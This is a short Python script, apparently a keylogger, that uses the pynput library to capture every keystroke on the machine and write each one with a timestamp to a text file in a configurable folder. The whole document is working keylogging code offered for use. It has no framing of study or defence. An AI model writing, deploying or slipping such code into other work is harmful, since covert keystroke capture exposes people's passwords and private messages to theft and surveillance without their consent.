import pynput
from pynput.keyboard import Key, Listener
import logging

#Change the location of the .txt file here:
log_directory = r"C:/location/of/output/file"


logging.basicConfig(filename = (log_directory + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
   logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()